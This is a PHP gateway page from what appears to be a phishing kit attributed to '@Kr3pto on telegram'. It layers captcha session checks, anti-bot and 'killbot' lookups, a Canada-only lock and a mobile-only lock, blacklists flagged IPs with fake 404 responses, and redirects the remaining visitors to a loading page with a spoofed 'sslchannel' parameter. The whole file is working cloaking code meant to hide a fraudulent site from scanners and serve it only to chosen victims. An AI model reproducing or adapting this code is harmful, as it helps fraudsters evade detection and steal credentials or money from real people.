<?php
// @Kr3pto on telegram
require "configg.php";
require "tc_assetz/ninc/session_protect.php";
require "tc_assetz/ninc/functions.php";
if($_SESSION['passed_captcha'] == 'yes'){
  
}else{
  header( "Location: index.php" ); 
}
if($internal_antibot == 1){
  require "tc_assetz/old_blocker.php";
}
if($enable_killbot == 1){
  if(checkkillbot($killbot_key) == true){
    $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
    fputs($fp, "\r\n$ip\r\n");
    fclose($fp);
    header_remove();
    header("Connection: close\r\n");
    http_response_code(404);
    exit;
  }
}
if($mobile_lock == 1){
  require "tc_assetz/mob_lock.php";
}
if($CA_lock == 1){
  if(onlyca() == true){
  
  }else{
    $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
    fputs($fp, "\r\n$ip\r\n");
    fclose($fp);
    header_remove();
    header("Connection: close\r\n");
    http_response_code(404);
    exit;
  }
}
if($external_antibot == 1){
  if(checkBot($apikey) == true){
    $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
    fputs($fp, "\r\n$ip\r\n");
    fclose($fp);
    header_remove();
    header("Connection: close\r\n");
    http_response_code(404);
    exit;
  }
}
?>
<?php
include('blackhole/index.php');
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';
                include 'prevents/block.php';
?>
<!DOCTYPE html>
<script type="text/javascript">
<!--
if (screen.width >= 699) {
document.location = "antibot.php";
}
//-->
</script>
<?php

    
   $url = "loading3.php?sslchannel=true&sessionid=<?=generateRandomString(130);?>"
     ?>
<meta http-equiv="refresh" content="0;url=<?php print "$url"; ?>">